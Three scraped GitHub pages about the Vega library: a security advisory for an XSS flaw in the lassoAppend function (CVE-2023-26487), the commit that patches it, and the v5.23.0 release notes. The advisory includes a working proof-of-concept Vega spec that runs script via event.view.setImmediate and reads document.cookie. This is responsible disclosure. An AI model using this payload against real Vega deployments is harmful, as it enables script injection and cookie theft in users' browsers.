=== Content from github.com_a378c236_20250114_232727.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fvega%2Fvega%2Fsecurity%2Fadvisories%2FGHSA-w5m3-xh75-mp55)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fvega%2Fvega%2Fsecurity%2Fadvisories%2FGHSA-w5m3-xh75-mp55)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=vega%2Fvega)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[vega](/vega)
/
**[vega](/vega/vega)**
Public

* [Notifications](/login?return_to=%2Fvega%2Fvega) You must be signed in to change notification settings
* [Fork
  1.5k](/login?return_to=%2Fvega%2Fvega)
* [Star
   11.3k](/login?return_to=%2Fvega%2Fvega)

* [Code](/vega/vega)
* [Issues
  459](/vega/vega/issues)
* [Pull requests
  32](/vega/vega/pulls)
* [Discussions](/vega/vega/discussions)
* [Actions](/vega/vega/actions)
* [Security](/vega/vega/security)
* [Insights](/vega/vega/pulse)

Additional navigation options

* [Code](/vega/vega)
* [Issues](/vega/vega/issues)
* [Pull requests](/vega/vega/pulls)
* [Discussions](/vega/vega/discussions)
* [Actions](/vega/vega/actions)
* [Security](/vega/vega/security)
* [Insights](/vega/vega/pulse)

# XSS vulnerability in `lassoAppend` function

Moderate

[jheer](/jheer)
published
GHSA-w5m3-xh75-mp55
Mar 1, 2023

## Package

npm

vega
([npm](/advisories?query=ecosystem%3Anpm))

## Affected versions

< 5.23.0

## Patched versions

5.23.0

npm

vega-functions
([npm](/advisories?query=ecosystem%3Anpm))

< 5.13.1

5.13.1

## Description

### Summary

Vega's `lassoAppend` function: `lassoAppend` accepts 3 arguments and internally invokes `push` function on the 1st argument specifying array consisting of 2nd and 3rd arguments as `push` call argument. The type of the 1st argument is supposed to be an array, but it's not enforced.

This makes it possible to specify any object with a `push` function as the 1st argument, `push` function can be set to any function that can be access via `event.view` (no all such functions can be exploited due to invalid context or signature, but some can, e.g. `console.log`).

### Details

The issue is that [`lassoAppend`](https://github.com/vega/vega/blob/7eafbbd4d53d0ce9f08e74ff96c90d411b1bb80a/packages/vega-functions/src/functions/lasso.js#L13) doesn't enforce proper types of its arguments:

```
.....
export function lassoAppend(lasso, x, y, minDist = 5) {
    const last = lasso[lasso.length - 1];

    // Add point to lasso if distance to last point exceed minDist or its the first point
    if (last === undefined || Math.sqrt(((last[0] - x) ** 2) + ((last[1] - y) ** 2)) > minDist) {
        lasso.push([x, y]);
.....
```
### PoC

Use the following Vega snippet (depends on browser's non-built-in `event.view.setImmediate` function, feel free to replace with `event.view.console.log` or alike and observe the result in the browser's console)

```
{
  "$schema": "https://vega.github.io/schema/vega/v5.json",
  "width": 350,
  "height": 350,
  "autosize": "none",
  "description": "Toggle Button",
  "signals": [
    {
      "name": "toggle",
      "value": false,
      "on": [
        {
          "events": {"type": "click", "markname": "circle"},
          "update": "toggle ? false : true"
        }
      ]
    },
    {
      "name": "addFilter",
      "on": [
        {
          "events": {"type": "mousemove", "source": "window"},
          "update": "lassoAppend({'push':event.view.setImmediate},'alert(document.domain)','alert(document.cookie)')"
        }
      ]
    }
  ],
  "marks": [
    {
      "name": "circle",
      "type": "symbol",
      "zindex": 1,
      "encode": {
        "enter": {
          "y": {"signal": "height/2"},
          "angle": {"value": 0},
          "size": {"value": 400},
          "shape": {"value": "circle"},
          "fill": {"value": "white"},
          "stroke": {"value": "white"},
          "strokeWidth": {"value": 2},
          "cursor": {"value": "pointer"},
          "tooltip": {"signal": "{Tip: 'Click to fire XSS'}"}
        },
        "update": {"x": {"signal": "toggle === true ? 190 : 165"}}
      }
    },
    {
      "name": "rectangle",
      "type": "rect",
      "zindex": 0,
      "encode": {
        "enter": {
          "x": {"value": 152},
          "y": {"value": 162.5},
          "width": {"value": 50},
          "height": {"value": 25},
          "cornerRadius": {"value": 20}
        },
        "update": {
          "fill": {"signal": "toggle === true ? '#006BB4' : '#939597'"}
        }
      }
    }
  ]
}
```
### Impact

This issue opens various XSS vectors, but exact impact and severity depends on the environment (e.g. Core JS `setImmediate` polyfill basically allows `eval`-like functionality).

### Severity

Moderate

### CVE ID

CVE-2023-26487

### Weaknesses

No CWEs

### Credits

* [![@azasypkin](https://avatars.githubusercontent.com/u/1713708?s=40&v=4)](/azasypkin)
  [azasypkin](/azasypkin)
  Reporter

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_e8f729d4_20250114_232721.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fvega%2Fvega%2Fcommit%2F01adb034f24727d3bb321bbbb6696a7f4cd91689)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fvega%2Fvega%2Fcommit%2F01adb034f24727d3bb321bbbb6696a7f4cd91689)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=vega%2Fvega)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[vega](/vega)
/
**[vega](/vega/vega)**
Public

* [Notifications](/login?return_to=%2Fvega%2Fvega) You must be signed in to change notification settings
* [Fork
  1.5k](/login?return_to=%2Fvega%2Fvega)
* [Star
   11.3k](/login?return_to=%2Fvega%2Fvega)

* [Code](/vega/vega)
* [Issues
  459](/vega/vega/issues)
* [Pull requests
  32](/vega/vega/pulls)
* [Discussions](/vega/vega/discussions)
* [Actions](/vega/vega/actions)
* [Security](/vega/vega/security)
* [Insights](/vega/vega/pulse)

Additional navigation options

* [Code](/vega/vega)
* [Issues](/vega/vega/issues)
* [Pull requests](/vega/vega/pulls)
* [Discussions](/vega/vega/discussions)
* [Actions](/vega/vega/actions)
* [Security](/vega/vega/security)
* [Insights](/vega/vega/pulse)

## Commit

[Permalink](/vega/vega/commit/01adb034f24727d3bb321bbbb6696a7f4cd91689)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

fix: lassoAppend XSS w/typecheck + array spread instead of push

[Browse files](/vega/vega/tree/01adb034f24727d3bb321bbbb6696a7f4cd91689)
Browse the repository at this point in the history

* Loading branch information

[![@arvind](https://avatars.githubusercontent.com/u/42262?s=40&v=4)](/arvind) [![@jheer](https://avatars.githubusercontent.com/u/202799?s=40&v=4)](/jheer)

[arvind](/vega/vega/commits?author=arvind "View all commits by arvind")
authored and
[jheer](/vega/vega/commits?author=jheer "View all commits by jheer")
committed
Feb 28, 2023

1 parent
[8d4865d](/vega/vega/commit/8d4865d4eea7d06245c57b15bc6591d5ba6dd224)

commit 01adb03

Showing
**1 changed file**
with
**57 additions**
and
**59 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

## There are no files selected for viewing

116 changes: 57 additions & 59 deletions

116
[packages/vega-functions/src/functions/lasso.js](#diff-547caeeef0ceae19c314c72edcd93ab9aac4a9462ada8fbae25ec7d37fad147b "packages/vega-functions/src/functions/lasso.js")

Show comments

[View file](/vega/vega/blob/01adb034f24727d3bb321bbbb6696a7f4cd91689/packages/vega-functions/src/functions/lasso.js)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,110 +1,108 @@ |
|  |  | import intersect from './intersect'; |
|  |  | import { Bounds } from 'vega-scenegraph'; |
|  |  | import {Bounds} from 'vega-scenegraph'; |
|  |  | import {array} from 'vega-util'; |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Appends a new point to the lasso |
|  |  | \* |
|  |  | \* |
|  |  | \* @param {\*} lasso the lasso in pixel space |
|  |  | \* @param {\*} x the x coordinate in pixel space |
|  |  | \* @param {\*} y the y coordinate in pixel space |
|  |  | \* @param {\*} minDist the minimum distance, in pixels, that thenew point needs to be apart from the last point |
|  |  | \* @returns a new array containing the lasso with the new point |
|  |  | \*/ |
|  |  | export function lassoAppend(lasso, x, y, minDist = 5) { |
|  |  | const last = lasso[lasso.length - 1]; |
|  |  | lasso = array(lasso); |
|  |  | const last = lasso[lasso.length - 1]; |
|  |  |  |
|  |  | // Add point to lasso if distance to last point exceed minDist or its the first point |
|  |  | if (last === undefined || Math.sqrt(((last[0] - x) \*\* 2) + ((last[1] - y) \*\* 2)) > minDist) { |
|  |  | lasso.push([x, y]); |
|  |  |  |
|  |  | return [...lasso]; |
|  |  | } |
|  |  |  |
|  |  | return lasso; |
|  |  | // Add point to lasso if its the first point or distance to last point exceed minDist |
|  |  | return (last === undefined || Math.sqrt(((last[0] - x) \*\* 2) + ((last[1] - y) \*\* 2)) > minDist) |
|  |  | ? [...lasso, [x, y]] |
|  |  | : lasso; |
|  |  | } |
|  |  |  |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Generates a svg path command which draws a lasso |
|  |  | \* |
|  |  | \* |
|  |  | \* @param {\*} lasso the lasso in pixel space in the form [[x,y], [x,y], ...] |
|  |  | \* @returns the svg path command that draws the lasso |
|  |  | \*/ |
|  |  | export function lassoPath(lasso) { |
|  |  | return (lasso ?? []).reduce((svg, [x, y], i) => { |
|  |  | return svg += i == 0 |
|  |  | ? `M ${x},${y} ` |
|  |  | : i === lasso.length - 1 |
|  |  | ? ' Z' |
|  |  | : `L ${x},${y} `; |
|  |  | }, ''); |
|  |  | return array(lasso).reduce((svg, [x, y], i) => { |
|  |  | return svg += i == 0 |
|  |  | ? `M ${x},${y} ` |
|  |  | : i === lasso.length - 1 |
|  |  | ? ' Z' |
|  |  | : `L ${x},${y} `; |
|  |  | }, ''); |
|  |  | } |
|  |  |  |
|  |  |  |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Inverts the lasso from pixel space to an array of vega scenegraph tuples |
|  |  | \* |
|  |  | \* |
|  |  | \* @param {\*} data the dataset |
|  |  | \* @param {\*} pixelLasso the lasso in pixel space, [[x,y], [x,y], ...] |
|  |  | \* @param {\*} unit the unit where the lasso is defined |
|  |  | \* |
|  |  | \* |
|  |  | \* @returns an array of vega scenegraph tuples |
|  |  | \*/ |
|  |  | export function intersectLasso(markname, pixelLasso, unit) { |
|  |  | const { x, y, mark } = unit; |
|  |  |  |
|  |  | const bb = new Bounds().set( |
|  |  | Number.MAX\_SAFE\_INTEGER, |
|  |  | Number.MAX\_SAFE\_INTEGER, |
|  |  | Number.MIN\_SAFE\_INTEGER, |
|  |  | Number.MIN\_SAFE\_INTEGER |
|  |  | ); |
|  |  |  |
|  |  | // Get bounding box around lasso |
|  |  | for (const [px, py] of pixelLasso) { |
|  |  | if (px < bb.x1) bb.x1 = px; |
|  |  | if (px > bb.x2) bb.x2 = px; |
|  |  | if (py < bb.y1) bb.y1 = py; |
|  |  | if (py > bb.y2) bb.y2 = py; |
|  |  | } |
|  |  |  |
|  |  | // Translate bb against unit coordinates |
|  |  | bb.translate(x, y); |
|  |  |  |
|  |  | const intersection = intersect([[bb.x1, bb.y1], [bb.x2, bb.y2]], |
|  |  | markname, |
|  |  | mark); |
|  |  |  |
|  |  | // Check every point against the lasso |
|  |  | return intersection.filter(tuple => pointInPolygon(tuple.x, tuple.y, pixelLasso)); |
|  |  | const { x, y, mark } = unit; |
|  |  |  |
|  |  | const bb = new Bounds().set( |
|  |  | Number.MAX\_SAFE\_INTEGER, |
|  |  | Number.MAX\_SAFE\_INTEGER, |
|  |  | Number.MIN\_SAFE\_INTEGER, |
|  |  | Number.MIN\_SAFE\_INTEGER |
|  |  | ); |
|  |  |  |
|  |  | // Get bounding box around lasso |
|  |  | for (const [px, py] of pixelLasso) { |
|  |  | if (px < bb.x1) bb.x1 = px; |
|  |  | if (px > bb.x2) bb.x2 = px; |
|  |  | if (py < bb.y1) bb.y1 = py; |
|  |  | if (py > bb.y2) bb.y2 = py; |
|  |  | } |
|  |  |  |
|  |  | // Translate bb against unit coordinates |
|  |  | bb.translate(x, y); |
|  |  |  |
|  |  | const intersection = intersect([[bb.x1, bb.y1], [bb.x2, bb.y2]], |
|  |  | markname, |
|  |  | mark); |
|  |  |  |
|  |  | // Check every point against the lasso |
|  |  | return intersection.filter(tuple => pointInPolygon(tuple.x, tuple.y, pixelLasso)); |
|  |  | } |
|  |  |  |
|  |  |  |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Performs a test if a point is inside a polygon based on the idea from |
|  |  | \* https://wrf.ecse.rpi.edu/Research/Short\_Notes/pnpoly.html |
|  |  | \* |
|  |  | \* |
|  |  | \* This method will not need the same start/end point since it wraps around the edges of the array |
|  |  | \* |
|  |  | \* |
|  |  | \* @param {\*} test a point to test against |
|  |  | \* @param {\*} polygon a polygon in the form [[x,y], [x,y], ...] |
|  |  | \* @returns true if the point lies inside the polygon, false otherwise |
|  |  | \*/ |
|  |  | function pointInPolygon(testx, testy, polygon) { |
|  |  | let intersections = 0; |
|  |  | let intersections = 0; |
|  |  |  |
|  |  | for (let i = 0, j = polygon.length - 1; i < polygon.length; j = i++) { |
|  |  | const [prevX, prevY] = polygon[j]; |
|  |  | const [x, y] = polygon[i]; |
|  |  | for (let i = 0, j = polygon.length - 1; i < polygon.length; j = i++) { |
|  |  | const [prevX, prevY] = polygon[j]; |
|  |  | const [x, y] = polygon[i]; |
|  |  |  |
|  |  | // count intersections |
|  |  | if (((y > testy) != (prevY > testy)) && (testx < (prevX - x) \* (testy - y) / (prevY - y) + x)) { |
|  |  | intersections++; |
|  |  | } |
|  |  | // count intersections |
|  |  | if (((y > testy) != (prevY > testy)) && (testx < (prevX - x) \* (testy - y) / (prevY - y) + x)) { |
|  |  | intersections++; |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | // point is in polygon if intersection count is odd |
|  |  | return intersections & 1; |
|  |  | // point is in polygon if intersection count is odd |
|  |  | return intersections & 1; |
|  |  | } |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `01adb03`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fvega%2Fvega%2Fcommit%2F01adb034f24727d3bb321bbbb6696a7f4cd91689) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_bc3df7be_20250114_232724.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fvega%2Fvega%2Freleases%2Ftag%2Fv5.23.0)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fvega%2Fvega%2Freleases%2Ftag%2Fv5.23.0)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Freleases%2Fshow&source=header-repo&source_repo=vega%2Fvega)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[vega](/vega)
/
**[vega](/vega/vega)**
Public

* [Notifications](/login?return_to=%2Fvega%2Fvega) You must be signed in to change notification settings
* [Fork
  1.5k](/login?return_to=%2Fvega%2Fvega)
* [Star
   11.3k](/login?return_to=%2Fvega%2Fvega)

* [Code](/vega/vega/tree/v5.23.0)
* [Issues
  459](/vega/vega/issues)
* [Pull requests
  32](/vega/vega/pulls)
* [Discussions](/vega/vega/discussions)
* [Actions](/vega/vega/actions)
* [Security](/vega/vega/security)
* [Insights](/vega/vega/pulse)

Additional navigation options

* [Code](/vega/vega/tree/v5.23.0)
* [Issues](/vega/vega/issues)
* [Pull requests](/vega/vega/pulls)
* [Discussions](/vega/vega/discussions)
* [Actions](/vega/vega/actions)
* [Security](/vega/vega/security)
* [Insights](/vega/vega/pulse)

1. [Releases](/vega/vega/releases)
2. [v5.23.0](/vega/vega/releases/tag/v5.23.0)

# v5.23.0

 Compare

Choose a tag to compare

Could not load tags

Nothing to show

[{{ refName }}
default](/vega/vega/compare/%7B%7B%20urlEncodedRefName%20%7D%7D...v5.23.0)

 Loading

[View all tags](/vega/vega/tags)

![@jheer](https://avatars.githubusercontent.com/u/202799?s=40&v=4)
[jheer](/jheer)
released this
01 Mar 20:35

·
[120 commits](/vega/vega/compare/v5.23.0...main)
to main
since this release

[v5.23.0](/vega/vega/tree/v5.23.0)

[`fb1092f`](/vega/vega/commit/fb1092f6b931d450f9c210b67ae4752bd3dd461b)

Changes from [v5.22.1](https://github.com/vega/vega/releases/tag/v5.22.1):

This version contains dependency updates, bug fixes, and security patches, plus a few extra utilities to aid Vega-Lite.

**monorepo**

* Update dependencies, including D3 packages.
* Update rollup config to use `.mjs` extensions.

**vega-canvas**

* Update rollup config.

**vega-crossfilter**

* Update rollup config.

**vega-dataflow**

* Update rollup config.

**vega-encode**

* Update rollup config.

**vega-event-selector**

* Update rollup config.

**vega-expression**

* Update rollup config.

**vega-force**

* Update rollup config.

**vega-format**

* Update rollup config.

**vega-functions**

* Fix `lassoAppend` expression function XSS. (**Thanks [@arvind](https://github.com/arvind)!**)
* Fix `scale` expression function XSS (**Thanks [@ajxchapman](https://github.com/ajxchapman) and [@hydrosquall](https://github.com/hydrosquall)!**)
* Update rollup config.

**vega-geo**

* Update rollup config.

**vega-hierarchy**

* Update rollup config.

**vega-interpreter**

* Update rollup config.

**vega-label**

* Prevent evaluation of unsafe methods, [#3570](https://github.com/vega/vega/pull/3570) (**Thanks [@AMoo-Miki](https://github.com/AMoo-Miki)!**)
* Update rollup config.

**vega-loader**

* Update rollup config.

**vega-parser**

* Add `view` style for Vega-Lite, [#3480](https://github.com/vega/vega/pull/3480) (**Thanks [@arvind](https://github.com/arvind)!**)
* Update rollup config.

**vega-projection**

* Register projections as recognized Vega scales.
* Update rollup config.

**vega-projection-extended**

* Update rollup config.

**vega-regression**

* Update rollup config.

**vega-runtime**

* Update rollup config.

**vega-scale**

* Add `registerScale()` and `isRegisteredScale()` methods. (**Thanks [@hydrosquall](https://github.com/hydrosquall)!**)
* Register scales as recognized Vega scales.
* Update rollup config.

**vega-scenegraph**

* Update test cases to match dependency updates.
* Update rollup config.

**vega-schema**

* Make `__count__` private from schema, [#3659](https://github.com/vega/vega/pull/3659) (**Thanks [@lsh](https://github.com/lsh)!**)
* Update rollup config.

**vega-selections**

* Update rollup config.

**vega-statistics**

* Update rollup config.

**vega-time**

* Update rollup config.

**vega-transforms**

* Update rollup config.

**vega-typings**

* Make `__count__` private from schema, [#3659](https://github.com/vega/vega/pull/3659) (**Thanks [@lsh](https://github.com/lsh)!**)
* Update scenegraph item typings (**Thanks [@jonathanzong](https://github.com/jonathanzong)!**)
* Update rollup config.

**vega-util**

* Update typescript config.
* Update rollup config.

**vega-view**

* Wrap querySelectorAll in Array.from, [#3639](https://github.com/vega/vega/issues/3639) (**Thanks [@ravron](https://github.com/ravron)!**)
* Update rollup config.

**vega-view-transforms**

* Update rollup config.
* Fix autosize="fit-x/y" when legend is larger than plot, [#3474](https://github.com/vega/vega/pull/3474) (**Thanks [@stas-sl](https://github.com/stas-sl)!**)

**vega-voronoi**

* Update rollup config.

**vega-wordcloud**

* Update rollup config.

**vega-cli**

* Update rimraf version, adjust code in response.
* Update rollup config.

**vega**

* Update test scenes to match dependency updates.
* Update rollup config.

### Contributors

* [![@arvind](https://avatars.githubusercontent.com/u/42262?s=64&v=4)](https://github.com/arvind)
* [![@lsh](https://avatars.githubusercontent.com/u/1734032?s=64&v=4)](https://github.com/lsh)
* [![@AMoo-Miki](https://avatars.githubusercontent.com/u/3527403?s=64&v=4)](https://github.com/AMoo-Miki)
* [![@ajxchapman](https://avatars.githubusercontent.com/u/3729326?s=64&v=4)](https://github.com/ajxchapman)
* [![@stas-sl](https://avatars.githubusercontent.com/u/4602302?s=64&v=4)](https://github.com/stas-sl)
* [![@jonathanzong](https://avatars.githubusercontent.com/u/4650077?s=64&v=4)](https://github.com/jonathanzong)
* [![@ravron](https://avatars.githubusercontent.com/u/5354796?s=64&v=4)](https://github.com/ravron)
* [![@hydrosquall](https://avatars.githubusercontent.com/u/9020979?s=64&v=4)](https://github.com/hydrosquall)

arvind, lsh, and 6 other contributors

 Assets
2

 Loading

All reactions

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
